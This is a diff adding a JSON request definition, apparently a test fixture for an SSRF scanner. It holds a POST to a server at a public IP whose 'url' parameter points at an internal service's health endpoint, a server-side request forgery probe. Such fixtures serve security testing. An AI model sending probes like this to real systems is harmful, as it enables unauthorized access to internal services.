@@ -1,0 +1,10 @@
+{
+    "url": "http://13.125.233.51/pre-course/write",
+    "method": "POST",
+    "parameters": {
+        "url": "http://internal-service:9000/health",
+        "action": "preview",
+        "title": "SSRF Scanner Test"
+    },
+    "session_cookie": ""
+}
